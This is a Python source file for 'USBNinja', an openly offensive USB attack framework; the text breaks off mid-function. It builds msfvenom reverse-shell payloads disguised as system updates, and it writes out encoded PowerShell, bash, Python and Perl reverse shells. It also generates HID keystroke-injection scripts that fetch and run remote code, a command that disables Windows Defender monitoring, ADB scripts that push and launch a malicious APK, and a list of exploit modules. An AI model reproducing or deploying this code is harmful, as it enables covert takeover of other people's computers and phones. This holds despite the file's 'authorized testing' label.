#!/usr/bin/env python3
"""
USBNinja v2.0 - Advanced USB Attack Automation Framework
Metasploit-Integrated Payload Generation & Deployment
Now with Android USB exploitation support

For authorized penetration testing only.
"""

import os
import sys
import json
import time
import shutil
import hashlib
import argparse
import subprocess
import threading
import base64
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
import re

# Color scheme - Metasploit Style
class Style:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'
    
    MSF_RED = '\033[38;5;196m'
    MSF_BLUE = '\033[38;5;33m'
    MSF_GREEN = '\033[38;5;82m'
    MSF_YELLOW = '\033[38;5;226m'
    MSF_ORANGE = '\033[38;5;208m'
    MSF_PURPLE = '\033[38;5;141m'
    
    @staticmethod
    def success(text): 
        return f"{Style.MSF_GREEN}[+]{Style.END} {text}"
    
    @staticmethod
    def error(text): 
        return f"{Style.MSF_RED}[-]{Style.END} {text}"
    
    @staticmethod
    def info(text): 
        return f"{Style.MSF_BLUE}[*]{Style.END} {text}"
    
    @staticmethod
    def warning(text): 
        return f"{Style.MSF_YELLOW}[!]{Style.END} {text}"

# ASCII Art Banners
MSF_BANNER = """
                                                  
      =[ USBNinja v2.0 - Enhanced Edition    ]
+ -- --=[ USB Attack Automation Framework    ]
+ -- --=[ Metasploit Integration Layer       ]
+ -- --=[ Multi-Platform Payload Builder     ]
+ -- --=[ Android USB Exploitation Suite     ]
      =[ For Authorized Testing Only         ]
                                                  
"""

def print_banner():
    print(Style.MSF_RED + MSF_BANNER + Style.END)
    print(Style.DIM + ('-' * 60) + Style.END + '\n')

def print_status(message: str, status: str = "info"):
    status_map = {
        'success': Style.success,
        'error': Style.error,
        'info': Style.info,
        'warning': Style.warning,
    }
    func = status_map.get(status, Style.info)
    print(func(message))

# Progress Bar
class ProgressBar:
    def __init__(self, total: int, desc: str = "Processing"):
        self.total = total
        self.current = 0
        self.desc = desc
        self.start_time = time.time()
        
    def update(self, amount: int = 1):
        self.current += amount
        if self.total == 0:
            return
        percent = (self.current / self.total) * 100
        filled = int(percent / 2)
        bar = '#' * filled + '.' * (50 - filled)
        
        elapsed = time.time() - self.start_time
        rate = self.current / elapsed if elapsed > 0 else 0
        
        sys.stdout.write(f'\r{Style.MSF_BLUE}[*]{Style.END} {self.desc}: [{bar}] {percent:.1f}% ({rate:.1f}/s)')
        sys.stdout.flush()
        
        if self.current >= self.total:
            print()
    
    def finish(self):
        self.current = self.total
        self.update(0)

# Metasploit Integration
class MetasploitInterface:
    def __init__(self):
        self.handlers = []
        self.sessions = []
        
    def generate_payload(self, payload_type: str, lhost: str, lport: int,
                        output_path: Path, format_type: str, 
                        encoder: str = None, iterations: int = 3) -> bool:
        """Generate payload using msfvenom with error handling"""
        print_status(f"Generating {payload_type} payload...", "info")
        
        cmd = [
            'msfvenom',
            '-p', payload_type,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', format_type,
            '-o', str(output_path)
        ]
        
        if encoder:
            cmd.extend(['-e', encoder, '-i', str(iterations)])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if result.returncode == 0:
                if output_path.exists():
                    print_status(f"Payload saved: {output_path.name}", "success")
                    return True
                else:
                    print_status(f"Payload file not created", "error")
                    return False
            else:
                print_status(f"Generation failed: {result.stderr}", "error")
                return False
        except subprocess.TimeoutExpired:
            print_status("Payload generation timed out", "error")
            return False
        except Exception as e:
            print_status(f"Exception: {str(e)}", "error")
            return False
    
    def create_handler_rc(self, handlers: List[Dict], output_path: Path) -> bool:
        """Generate multi-handler resource script with validation"""
        print_status("Creating Metasploit handler resource script...", "info")
        
        try:
            rc_content = "# USBNinja Multi-Handler Resource Script\n"
            rc_content += f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            rc_content += "banner\n"
            rc_content += 'setg PROMPT "msf6 USBNinja > "\n'
            rc_content += "setg LOGLEVEL 2\n\n"
            
            for idx, handler in enumerate(handlers):
                rc_content += f"\n# Handler {idx + 1}: {handler['name']}\n"
                rc_content += "use exploit/multi/handler\n"
                rc_content += f"set PAYLOAD {handler['payload']}\n"
                rc_content += f"set LHOST {handler['lhost']}\n"
                rc_content += f"set LPORT {handler['lport']}\n"
                rc_content += "set ExitOnSession false\n"
                rc_content += "set EnableStageEncoding true\n"
                rc_content += "exploit -j -z\n\n"
            
            rc_content += "\n# Display status\n"
            rc_content += "jobs -v\n"
            rc_content += "sessions -l\n"
            rc_content += 'echo ""\n'
            rc_content += 'echo "[+] USBNinja handlers active"\n'
            rc_content += 'echo "[!] Waiting for connections..."\n'
            rc_content += 'echo ""\n'
            
            output_path.write_text(rc_content)
            print_status(f"Handler script created: {output_path.name}", "success")
            return True
        except Exception as e:
            print_status(f"Failed to create handler script: {str(e)}", "error")
            return False

# Advanced Exploit Database
class ExploitDatabase:
    """Database of advanced exploits for various platforms"""
    
    @staticmethod
    def get_windows_exploits() -> List[Dict]:
        """Return list of advanced Windows exploits"""
        return [
            {
                'name': 'EternalBlue (MS17-010)',
                'module': 'exploit/windows/smb/ms17_010_eternalblue',
                'description': 'SMB Remote Code Execution',
                'rank': 'excellent'
            },
            {
                'name': 'BlueKeep (CVE-2019-0708)',
                'module': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
                'description': 'RDP Remote Code Execution',
                'rank': 'excellent'
            },
            {
                'name': 'PrintNightmare (CVE-2021-34527)',
                'module': 'exploit/windows/dcerpc/cve_2021_1675_printnightmare',
                'description': 'Print Spooler RCE',
                'rank': 'excellent'
            },
            {
                'name': 'SMBGhost (CVE-2020-0796)',
                'module': 'exploit/windows/smb/cve_2020_0796_smbghost',
                'description': 'SMBv3 Compression RCE',
                'rank': 'excellent'
            },
            {
                'name': 'Zerologon (CVE-2020-1472)',
                'module': 'auxiliary/admin/dcerpc/cve_2020_1472_zerologon',
                'description': 'Netlogon Privilege Escalation',
                'rank': 'excellent'
            },
            {
                'name': 'PetitPotam',
                'module': 'auxiliary/admin/dcerpc/petitpotam',
                'description': 'NTLM Relay Attack',
                'rank': 'good'
            }
        ]
    
    @staticmethod
    def get_linux_exploits() -> List[Dict]:
        """Return list of advanced Linux exploits"""
        return [
            {
                'name': 'Dirty Pipe (CVE-2022-0847)',
                'module': 'exploit/linux/local/cve_2022_0847_dirtypipe',
                'description': 'Linux Kernel Privilege Escalation',
                'rank': 'excellent'
            },
            {
                'name': 'PwnKit (CVE-2021-4034)',
                'module': 'exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec',
                'description': 'Polkit Privilege Escalation',
                'rank': 'excellent'
            },
            {
                'name': 'Sudo Baron Samedit (CVE-2021-3156)',
                'module': 'exploit/linux/local/sudo_baron_samedit',
                'description': 'Sudo Heap Overflow',
                'rank': 'excellent'
            },
            {
                'name': 'DirtyC0w (CVE-2016-5195)',
                'module': 'exploit/linux/local/dcow',
                'description': 'Copy-On-Write Vulnerability',
                'rank': 'excellent'
            },
            {
                'name': 'Overlayfs (CVE-2015-1328)',
                'module': 'exploit/linux/local/overlayfs_priv_esc',
                'description': 'Ubuntu Privilege Escalation',
                'rank': 'good'
            }
        ]
    
    @staticmethod
    def get_android_exploits() -> List[Dict]:
        """Return list of advanced Android exploits"""
        return [
            {
                'name': 'Stagefright',
                'module': 'exploit/android/browser/stagefright_mp4_tx3g_64bit',
                'description': 'Media Framework RCE',
                'rank': 'excellent'
            },
            {
                'name': 'Towelroot',
                'module': 'exploit/android/local/futex_requeue',
                'description': 'Kernel Privilege Escalation',
                'rank': 'excellent'
            },
            {
                'name': 'Dirty COW Android',
                'module': 'exploit/android/local/cve_2016_5195_dirtycow',
                'description': 'Android Root Exploit',
                'rank': 'excellent'
            },
            {
                'name': 'WebView addJavascriptInterface',
                'module': 'exploit/android/browser/webview_addjavascriptinterface',
                'description': 'Remote Code Execution via WebView',
                'rank': 'good'
            }
        ]
    
    @staticmethod
    def create_exploit_reference(output_dir: Path):
        """Create comprehensive exploit reference guide"""
        try:
            guide = "=" * 70 + "\n"
            guide += "              USBNINJA EXPLOIT REFERENCE GUIDE\n"
            guide += "=" * 70 + "\n\n"
            
            guide += "WINDOWS EXPLOITS:\n"
            guide += "-" * 70 + "\n"
            for exploit in ExploitDatabase.get_windows_exploits():
                guide += f"\nName: {exploit['name']}\n"
                guide += f"Module: {exploit['module']}\n"
                guide += f"Description: {exploit['description']}\n"
                guide += f"Rank: {exploit['rank']}\n"
            
            guide += "\n\nLINUX EXPLOITS:\n"
            guide += "-" * 70 + "\n"
            for exploit in ExploitDatabase.get_linux_exploits():
                guide += f"\nName: {exploit['name']}\n"
                guide += f"Module: {exploit['module']}\n"
                guide += f"Description: {exploit['description']}\n"
                guide += f"Rank: {exploit['rank']}\n"
            
            guide += "\n\nANDROID EXPLOITS:\n"
            guide += "-" * 70 + "\n"
            for exploit in ExploitDatabase.get_android_exploits():
                guide += f"\nName: {exploit['name']}\n"
                guide += f"Module: {exploit['module']}\n"
                guide += f"Description: {exploit['description']}\n"
                guide += f"Rank: {exploit['rank']}\n"
            
            guide += "\n\n" + "=" * 70 + "\n"
            guide += "Usage: msfconsole -q -x 'use [module]; set RHOSTS [target]; exploit'\n"
            guide += "=" * 70 + "\n"
            
            (output_dir / "EXPLOIT_REFERENCE.txt").write_text(guide)
            print_status("Exploit reference guide created", "success")
        except Exception as e:
            print_status(f"Failed to create exploit guide: {str(e)}", "error")

# Smart Payload Builder
class SmartPayloadBuilder:
    def __init__(self, msf: MetasploitInterface):
        self.msf = msf
        
    def build_windows_payloads(self, output_dir: Path, lhost: str, lport: int) -> Dict[str, Path]:
        """Build comprehensive Windows payload suite"""
        print_status("Building Windows payload suite...", "info")
        payloads = {}
        
        progress = ProgressBar(6, "Windows payloads")
        
        try:
            # 1. Standard EXE
            exe_path = output_dir / "WindowsUpdate.exe"
            if self.msf.generate_payload(
                'windows/meterpreter/reverse_tcp',
                lhost, lport, exe_path, 'exe',
                encoder='x86/shikata_ga_nai', iterations=5
            ):
                payloads['exe'] = exe_path
            progress.update()
            
            # 2. DLL
            dll_path = output_dir / "SecurityUpdate.dll"
            if self.msf.generate_payload(
                'windows/meterpreter/reverse_tcp',
                lhost, lport, dll_path, 'dll'
            ):
                payloads['dll'] = dll_path
            progress.update()
            
            # 3. PowerShell script
            ps1_path = output_dir / "invoke.ps1"
            ps_script = self._generate_ps_script(lhost, lport)
            ps1_path.write_text(ps_script)
            payloads['ps1'] = ps1_path
            progress.update()
            
            # 4. HTA file
            hta_path = output_dir / "update.hta"
            hta_content = self._generate_hta(lhost, lport)
            hta_path.write_text(hta_content)
            payloads['hta'] = hta_path
            progress.update()
            
            # 5. VBS script
            vbs_path = output_dir / "install.vbs"
            vbs_content = self._generate_vbs(lhost, lport)
            vbs_path.write_text(vbs_content)
            payloads['vbs'] = vbs_path
            progress.update()
            
            # 6. Batch launcher
            bat_path = output_dir / "install.bat"
            bat_content = "@echo off\ntitle System Update\ncd /d %~dp0\nstart /min WindowsUpdate.exe\nexit\n"
            bat_path.write_text(bat_content)
            payloads['bat'] = bat_path
            progress.update()
            
            progress.finish()
            print_status(f"Built {len(payloads)} Windows payloads", "success")
        except Exception as e:
            print_status(f"Error building Windows payloads: {str(e)}", "error")
        
        return payloads
    
    def _generate_ps_script(self, lhost: str, lport: int) -> str:
        """Generate PowerShell payload with error handling"""
        try:
            ps_base = f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$b2=([text.encoding]::ASCII).GetBytes($o2);$s.Write($b2,0,$b2.Length);$s.Flush()}};$c.Close()"
            
            encoded = base64.b64encode(ps_base.encode('utf-16le')).decode()
            
            script = "# Security Update Script\n"
            script += "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue\n"
            script += f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}\n"
            return script
        except Exception as e:
            print_status(f"Error generating PowerShell script: {str(e)}", "error")
            return "# Error generating payload\n"
    
    def _generate_hta(self, lhost: str, lport: int) -> str:
        """Generate HTA payload"""
        try:
            hta = "<html>\n"
            hta += "<head>\n"
            hta += "<title>Windows Security Update</title>\n"
            hta += '<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="SecurityUpdate" BORDER="none" SHOWINTASKBAR="no" SCROLL="no"/>\n'
            hta += "</head>\n"
            hta += "<body>\n"
            hta += '<script language="VBScript">\n'
            hta += 'Set objShell = CreateObject("WScript.Shell")\n'
            hta += f'objShell.Run "powershell -W Hidden -NoP -Exec Bypass -C ""IEX(New-Object Net.WebClient).DownloadString(' + "'http://" + str(lhost) + ":" + str(lport) + "/stage.ps1'" + ')""", 0, False\n'
            hta += "window.close()\n"
            hta += "</script>\n"
            hta += "</body>\n"
            hta += "</html>\n"
            return hta
        except Exception as e:
            print_status(f"Error generating HTA: {str(e)}", "error")
            return "<html><body>Error</body></html>\n"
    
    def _generate_vbs(self, lhost: str, lport: int) -> str:
        """Generate VBS payload"""
        try:
            vbs = 'Set objShell = CreateObject("WScript.Shell")\n'
            vbs += f'objShell.Run "powershell -W Hidden -NoP -Exec Bypass -C ""IEX(New-Object Net.WebClient).DownloadString(' + "'http://" + str(lhost) + ":" + str(lport) + "/p.ps1'" + ')""", 0, False\n'
            return vbs
        except Exception as e:
            print_status(f"Error generating VBS: {str(e)}", "error")
            return "' Error\n"
    
    def build_linux_payloads(self, output_dir: Path, lhost: str, lport: int) -> Dict[str, Path]:
        """Build Linux payload suite"""
        print_status("Building Linux payload suite...", "info")
        payloads = {}
        
        progress = ProgressBar(4, "Linux payloads")
        
        try:
            # 1. ELF binary
            elf_path = output_dir / "update_installer"
            if self.msf.generate_payload(
                'linux/x64/meterpreter/reverse_tcp',
                lhost, lport, elf_path, 'elf'
            ):
                elf_path.chmod(0o755)
                payloads['elf'] = elf_path
            progress.update()
            
            # 2. Bash script
            bash_path = output_dir / "install.sh"
            bash_script = "#!/bin/bash\n"
            bash_script += "# System Update Installer\n"
            bash_script += f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &\n"
            bash_path.write_text(bash_script)
            bash_path.chmod(0o755)
            payloads['bash'] = bash_path
            progress.update()
            
            # 3. Python payload
            py_path = output_dir / "updater.py"
            py_script = "#!/usr/bin/env python3\n"
            py_script += "import socket,subprocess,os\n"
            py_script += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            py_script += f's.connect(("{lhost}",{lport}))\n'
            py_script += "os.dup2(s.fileno(),0)\n"
            py_script += "os.dup2(s.fileno(),1)\n"
            py_script += "os.dup2(s.fileno(),2)\n"
            py_script += 'subprocess.call(["/bin/bash","-i"])\n'
            py_path.write_text(py_script)
            py_path.chmod(0o755)
            payloads['python'] = py_path
            progress.update()
            
            # 4. Perl payload
            pl_path = output_dir / "update.pl"
            pl_script = "#!/usr/bin/perl\n"
            pl_script += "use Socket;\n"
            pl_script += f'$i="{lhost}";$p={lport};\n'
            pl_script += 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\n'
            pl_script += 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\n'
            pl_path.write_text(pl_script)
            pl_path.chmod(0o755)
            payloads['perl'] = pl_path
            progress.update()
            
            progress.finish()
            print_status(f"Built {len(payloads)} Linux payloads", "success")
        except Exception as e:
            print_status(f"Error building Linux payloads: {str(e)}", "error")
        
        return payloads
    
    def build_macos_payloads(self, output_dir: Path, lhost: str, lport: int) -> Dict[str, Path]:
        """Build macOS payload suite"""
        print_status("Building macOS payload suite...", "info")
        payloads = {}
        
        progress = ProgressBar(3, "macOS payloads")
        
        try:
            # 1. Mach-O binary
            macho_path = output_dir / "Installer"
            if self.msf.generate_payload(
                'osx/x64/meterpreter/reverse_tcp',
                lhost, lport, macho_path, 'macho'
            ):
                macho_path.chmod(0o755)
                payloads['macho'] = macho_path
            progress.update()
            
            # 2. Shell script
            sh_path = output_dir / "install.sh"
            sh_script = "#!/bin/bash\n"
            sh_script += "# macOS System Update\n"
            sh_script += f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &\n"
            sh_path.write_text(sh_script)
            sh_path.chmod(0o755)
            payloads['shell'] = sh_path
            progress.update()
            
            # 3. Python for macOS
            py_path = output_dir / "updater_mac.py"
            py_script = "#!/usr/bin/env python3\n"
            py_script += "import socket,subprocess,os\n"
            py_script += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            py_script += f's.connect(("{lhost}",{lport}))\n'
            py_script += "os.dup2(s.fileno(),0)\n"
            py_script += "os.dup2(s.fileno(),1)\n"
            py_script += "os.dup2(s.fileno(),2)\n"
            py_script += 'subprocess.call(["/bin/bash","-i"])\n'
            py_path.write_text(py_script)
            py_path.chmod(0o755)
            payloads['python'] = py_path
            progress.update()
            
            progress.finish()
            print_status(f"Built {len(payloads)} macOS payloads", "success")
        except Exception as e:
            print_status(f"Error building macOS payloads: {str(e)}", "error")
        
        return payloads
    
    def build_android_payloads(self, output_dir: Path, lhost: str, lport: int) -> Dict[str, Path]:
        """Build Android payload suite with USB debugging support"""
        print_status("Building Android payload suite...", "info")
        payloads = {}
        
        progress = ProgressBar(4, "Android payloads")
        
        try:
            # 1. APK payload
            apk_path = output_dir / "SystemUpdate.apk"
            if self.msf.generate_payload(
                'android/meterpreter/reverse_tcp',
                lhost, lport, apk_path, 'raw'
            ):
                payloads['apk'] = apk_path
            progress.update()
            
            # 2. ADB exploitation script
            adb_script_path = output_dir / "adb_exploit.sh"
            adb_script = self._generate_adb_script(lhost, lport)
            adb_script_path.write_text(adb_script)
            adb_script_path.chmod(0o755)
            payloads['adb'] = adb_script_path
            progress.update()
            
            # 3. USB cable injection script
            usb_inject_path = output_dir / "usb_inject.sh"
            usb_inject = self._generate_usb_injection_script(lhost, lport, apk_path)
            usb_inject_path.write_text(usb_inject)
            usb_inject_path.chmod(0o755)
            payloads['usb_inject'] = usb_inject_path
            progress.update()
            
            # 4. Termux payload
            termux_path = output_dir / "termux_payload.sh"
            termux_script = "#!/data/data/com.termux/files/usr/bin/bash\n"
            termux_script += f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &\n"
            termux_path.write_text(termux_script)
            payloads['termux'] = termux_path
            progress.update()
            
            progress.finish()
            print_status(f"Built {len(payloads)} Android payloads", "success")
        except Exception as e:
            print_status(f"Error building Android payloads: {str(e)}", "error")
        
        return payloads
    
    def _generate_adb_script(self, lhost: str, lport: int) -> str:
        """Generate ADB exploitation script"""
        try:
            script = "#!/bin/bash\n"
            script += "# Android ADB Exploitation Script\n"
            script += "# Requires USB debugging enabled on target device\n\n"
            script += "echo '[*] Checking for connected Android devices...'\n"
            script += "adb devices\n\n"
            script += "if [ $? -ne 0 ]; then\n"
            script += "    echo '[-] ADB not found. Install with: apt-get install adb'\n"
            script += "    exit 1\n"
            script += "fi\n\n"
            script += "echo '[*] Pushing payload to device...'\n"
            script += "adb push SystemUpdate.apk /sdcard/Download/\n\n"
            script += "echo '[*] Installing payload...'\n"
            script += "adb install -r SystemUpdate.apk\n\n"
            script += "echo '[*] Starting payload...'\n"
            script += "adb shell am start -n com.metasploit.stage/.MainActivity\n\n"
            script += "echo '[+] Payload deployed. Check Metasploit handler for connection.'\n"
            return script
        except Exception as e:
            print_status(f"Error generating ADB script: {str(e)}", "error")
            return "#!/bin/bash\necho 'Error'\n"
    
    def _generate_usb_injection_script(self, lhost: str, lport: int, apk_path: Path) -> str:
        """Generate USB cable injection script for Android"""
        try:
            script = "#!/bin/bash\n"
            script += "# USB Cable Injection Script for Android\n"
            script += "# Auto-detects connected device and injects payload\n\n"
            script += "RED='\\033[0;31m'\n"
            script += "GREEN='\\033[0;32m'\n"
            script += "YELLOW='\\033[1;33m'\n"
            script += "NC='\\033[0m'\n\n"
            script += "echo -e \"${GREEN}[*] USBNinja Android USB Injection${NC}\"\n"
            script += "echo -e \"${YELLOW}[!] Ensure USB debugging is enabled${NC}\"\n"
            script += "echo ''\n\n"
            script += "# Check for ADB\n"
            script += "if ! command -v adb &> /dev/null; then\n"
            script += "    echo -e \"${RED}[-] ADB not found${NC}\"\n"
            script += "    echo '[*] Installing ADB...'\n"
            script += "    apt-get update && apt-get install -y adb\n"
            script += "fi\n\n"
            script += "# Start ADB server\n"
            script += "adb start-server\n"
            script += "sleep 2\n\n"
            script += "# Wait for device\n"
            script += "echo '[*] Waiting for device connection...'\n"
            script += "adb wait-for-device\n\n"
            script += "# Get device info\n"
            script += "DEVICE=$(adb devices | grep -w 'device' | awk '{print $1}')\n"
            script += "if [ -z \"$DEVICE\" ]; then\n"
            script += "    echo -e \"${RED}[-] No device detected${NC}\"\n"
            script += "    exit 1\n"
            script += "fi\n\n"
            script += "echo -e \"${GREEN}[+] Device detected: $DEVICE${NC}\"\n\n"
            script += "# Get device model\n"
            script += "MODEL=$(adb shell getprop ro.product.model)\n"
            script += "ANDROID_VER=$(adb shell getprop ro.build.version.release)\n"
            script += "echo \"[*] Device: $MODEL (Android $ANDROID_VER)\"\n\n"
            script += "# Push and install APK\n"
            script += "echo '[*] Pushing payload to device...'\n"
            script += f"adb push {apk_path.name} /sdcard/Download/SystemUpdate.apk\n\n"
            script += "echo '[*] Installing payload...'\n"
            script += "adb install -r /sdcard/Download/SystemUpdate.apk\n\n"
            script += "# Grant permissions\n"
            script += "echo '[*] Granting permissions...'\n"
            script += "adb shell pm grant com.metasploit.stage android.permission.INTERNET\n"
            script += "adb shell pm grant com.metasploit.stage android.permission.ACCESS_NETWORK_STATE\n"
            script += "adb shell pm grant com.metasploit.stage android.permission.READ_EXTERNAL_STORAGE\n"
            script += "adb shell pm grant com.metasploit.stage android.permission.WRITE_EXTERNAL_STORAGE\n\n"
            script += "# Start payload\n"
            script += "echo '[*] Launching payload...'\n"
            script += "adb shell monkey -p com.metasploit.stage 1\n\n"
            script += "echo -e \"${GREEN}[+] Payload deployed successfully${NC}\"\n"
            script += f"echo '[*] Handler listening on {lhost}:{lport}'\n"
            script += "echo '[*] Check Metasploit console for incoming session'\n"
            return script
        except Exception as e:
            print_status(f"Error generating USB injection script: {str(e)}", "error")
            return "#!/bin/bash\necho 'Error'\n"

# HID Attack Generator
class HIDAttackGenerator:
    def __init__(self):
        self.platforms = {
            'rubber_ducky': self._generate_ducky,
            'bash_bunny': self._generate_bash_bunny,
            'digispark': self._generate_digispark
        }
    
    def generate_all(self, output_dir: Path, lhost: str, lport: int, targets: List[str]):
        """Generate HID attacks for all platforms"""
        print_status("Generating HID injection attacks...", "info")
        
        try:
            for platform, generator in self.platforms.items():
                platform_dir = output_dir / platform
                platform_dir.mkdir(exist_ok=True, parents=True)
                generator(platform_dir, lhost, lport, targets)
            
            print_status(f"Generated HID attacks for {len(self.platforms)} platforms", "success")
        except Exception as e:
            print_status(f"Error generating HID attacks: {str(e)}", "error")
    
    def _generate_ducky(self, output_dir: Path, lhost: str, lport: int, targets: List[str]):
        """Generate Rubber Ducky scripts"""
        try:
            if 'windows' in targets:
                ducky_win = "REM USBNinja - Windows Attack\n"
                ducky_win += "REM Advanced multi-stage payload\n"
                ducky_win += "DELAY 2000\n"
                ducky_win += "GUI r\n"
                ducky_win += "DELAY 500\n"
                ducky_win += "STRING powershell -W Hidden -NoP -Exec Bypass\n"
                ducky_win += "ENTER\n"
                ducky_win += "DELAY 1500\n"
                ducky_win += f"STRING IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/w.ps1')\n"
                ducky_win += "ENTER\n"
                (output_dir / "windows.txt").write_text(ducky_win)
            
            if 'linux' in targets:
                ducky_lin = "REM USBNinja - Linux Attack\n"
                ducky_lin += "DELAY 1000\n"
                ducky_lin += "CTRL-ALT t\n"
                ducky_lin += "DELAY 500\n"
                ducky_lin += f"STRING curl -s http://{lhost}:{lport}/l.sh|bash&\n"
                ducky_lin += "ENTER\n"
                ducky_lin += "DELAY 200\n"
                ducky_lin += "STRING exit\n"
                ducky_lin += "ENTER\n"
                (output_dir / "linux.txt").write_text(ducky_lin)
            
            if 'macos' in targets:
                ducky_mac = "REM USBNinja - macOS Attack\n"
                ducky_mac += "DELAY 1000\n"
                ducky_mac += "GUI SPACE\n"
                ducky_mac += "DELAY 500\n"
                ducky_mac += "STRING terminal\n"
                ducky_mac += "ENTER\n"
                ducky_mac += "DELAY 1000\n"
                ducky_mac += f"STRING curl -s http://{lhost}:{lport}/m.sh|bash&\n"
                ducky_mac += "ENTER\n"
                (output_dir / "macos.txt").write_text(ducky_mac)
            
            if 'android' in targets:
                ducky_and = "REM USBNinja - Android Attack\n"
                ducky_and += "REM Requires USB debugging enabled\n"
                ducky_and += "DELAY 2000\n"
                ducky_and += "STRING am start -a android.intent.action.VIEW -d http://{}/SystemUpdate.apk\n".format(lhost + ":" + str(lport))
                ducky_and += "ENTER\n"
                (output_dir / "android.txt").write_text(ducky_and)
        except Exception as e:
            print_status(f"Error generating Ducky scripts: {str(e)}", "error")
    
    def _generate_bash_bunny(self, output_dir: Path, lhost: str, lport: int, targets: List[str]):
        """Generate Bash Bunny payloads"""
        try:
            payload = "#!/bin/bash\n"
            payload += "# USBNinja Bash Bunny Payload\n"
            payload += "# Multi-platform detection and exploitation\n\n"
            payload += "LED R\n"
            payload += "ATTACKMODE HID STORAGE\n"
            payload += "LED Y\n\n"
            payload += "# Detect target OS\n"
            payload += "GET TARGET_OS\n\n"
            payload += "case $TARGET_OS in\n"
            payload += "  WINDOWS)\n"
            payload += "    Q GUI r\n"
            payload += "    Q DELAY 500\n"
            payload += "    Q STRING powershell -W Hidden\n"
            payload += "    Q ENTER\n"
            payload += "    Q DELAY 1000\n"
            payload += f"    Q STRING IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/w')\n"
            payload += "    Q ENTER\n"
            payload += "    ;;\n"
            payload += "  LINUX)\n"
            payload += "    Q CTRL-ALT t\n"
            payload += "    Q DELAY 500\n"
            payload += f"    Q STRING curl http://{lhost}:{lport}/l|bash\n"
            payload += "    Q ENTER\n"
            payload += "    ;;\n"
            payload += "  OSX)\n"
            payload += "    Q GUI SPACE\n"
            payload += "    Q DELAY 500\n"
            payload += "    Q STRING terminal\n"
            payload += "    Q ENTER\n"
            payload += "    Q DELAY 1000\n"
            payload += f"    Q STRING curl http://{lhost}:{lport}/m|bash\n"
            payload += "    Q ENTER\n"
            payload += "    ;;\n"
            payload += "esac\n\n"
            payload += "LED G\n"
            payload += "sync\n"
            (output_dir / "payload.txt").write_text(payload)
        except Exception as e:
            print_status(f"Error generating Bash Bunny payload: {str(e)}", "error")
    
    def _generate_digispark(self, output_dir: Path, lhost: str, lport: int, targets: List[str]):
        """Generate DigiSpark Arduino sketch"""
        try:
            sketch = "/* USBNinja DigiSpark - Multi-Platform Attack */\n"
            sketch += '#include "DigiKeyboard.h"\n\n'
            sketch += "void setup() {\n"
            sketch += "  DigiKeyboard.delay(3000);\n"
            sketch += "  DigiKeyboard.sendKeyStroke(0);\n"
            sketch += "  DigiKeyboard.delay(500);\n\n"
            sketch += "  // Try Windows attack first\n"
            sketch += "  windowsAttack();\n"
            sketch += "  DigiKeyboard.delay(2000);\n\n"
            sketch += "  // Try macOS attack\n"
            sketch += "  macosAttack();\n"
            sketch += "  DigiKeyboard.delay(2000);\n\n"
            sketch += "  // Try Linux attack\n"
            sketch += "  linuxAttack();\n"
            sketch += "}\n\n"
            sketch += "void windowsAttack() {\n"
            sketch += "  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);\n"
            sketch += "  DigiKeyboard.delay(500);\n"
            sketch += '  DigiKeyboard.print(F("powershell -W Hidden -NoP"));\n'
            sketch += "  DigiKeyboard.sendKeyStroke(KEY_ENTER);\n"
            sketch += "  DigiKeyboard.delay(1500);\n"
            sketch += f'  DigiKeyboard.print(F("IEX(New-Object Net.WebClient).DownloadString(' + "'http://" + str(lhost) + ":" + str(lport) + "/w'" + ')"));\n'
            sketch += "  DigiKeyboard.sendKeyStroke(KEY_ENTER);\n"
            sketch += "}\n\n"
            sketch += "void macosAttack() {\n"
            sketch += "  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);\n"
            sketch += "  DigiKeyboard.delay(500);\n"
            sketch += '  DigiKeyboard.print(F("terminal"));\n'
            sketch += "  DigiKeyboard.delay(500);\n"
            sketch += "  DigiKeyboard.sendKeyStroke(KEY_ENTER);\n"
            sketch += "  DigiKeyboard.delay(1000);\n"
            sketch += f'  DigiKeyboard.print(F("curl http://{lhost}:{lport}/m|bash"));\n'
            sketch += "  DigiKeyboard.sendKeyStroke(KEY_ENTER);\n"
            sketch += "}\n\n"
            sketch += "void linuxAttack() {\n"
            sketch += "  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);\n"
            sketch += "  DigiKeyboard.delay(500);\n"
            sketch += f'  DigiKeyboard.print(F("curl http://{lhost}:{lport}/l|bash"));\n'
            sketch += "  DigiKeyboard.sendKeyStroke(KEY_ENTER);\n"
            sketch += "}\n\n"
            sketch += "void loop() {\n"
            sketch += "  DigiKeyboard.delay(60000);\n"
            sketch += "}\n"
            (output_dir / "usbninja.ino").write_text(sketch)
        except Exception as e:
